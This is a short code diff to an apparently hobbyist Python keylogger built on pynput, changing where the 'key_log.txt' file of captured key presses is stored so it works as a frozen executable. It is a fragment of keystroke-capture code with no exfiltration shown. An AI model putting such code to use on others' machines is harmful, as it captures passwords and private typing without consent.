@@ -1,7 +1,16 @@
+import os
+import sys
 import pynput
 from pynput import keyboard
 
-key_info = "key_log.txt" # text file for key presses
+
+def get_base_dir():
+    if getattr(sys, "frozen", False):
+        return os.path.dirname(sys.executable)
+    return os.path.dirname(os.path.abspath(__file__))
+
+key_info = os.path.join(get_base_dir(), "key_log.txt")
+open(key_info, "a").close()  # create file if missing
 
 #Function to log key presses
 def Keypress(key):
